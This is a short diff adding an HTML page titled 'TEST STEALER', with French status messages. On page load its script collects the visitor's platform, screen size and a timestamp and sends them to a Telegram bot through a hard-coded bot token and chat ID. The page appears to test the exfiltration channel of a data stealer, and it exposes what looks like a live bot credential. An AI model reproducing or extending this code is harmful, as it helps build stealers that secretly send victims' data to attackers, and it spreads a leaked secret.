@@ -1,0 +1,24 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body>
+<h1>🧪 TEST STEALER</h1>
+<p id="status">Envoi en cours...</p>
+<script>
+(async function(){
+  const TG="8924356503:AAHvOqKy29W8oJParf_WuZP8r2WbHvoon74";
+  const CID="7947710235";
+  
+  const msg = "✅ *TEST RÉUSSI* — "+new Date().toISOString().slice(0,19)+"\n📱 "+navigator.platform+" | "+screen.width+"x"+screen.height;
+  
+  try {
+    const r = await fetch("https://api.telegram.org/bot"+TG+"/sendMessage", {
+      method:"POST",
+      headers:{"Content-Type":"application/x-www-form-urlencoded"},
+      body:"chat_id="+CID+"&text="+encodeURIComponent(msg)+"&parse_mode=Markdown"
+    });
+    const d = await r.json();
+    document.getElementById("status").textContent = d.ok ? "✅ ENVOYÉ — Check Telegram !" : "❌ "+JSON.stringify(d);
+  } catch(e) {
+    document.getElementById("status").textContent = "❌ Erreur: "+e.message;
+  }
+})();
+</script>
+</body></html>
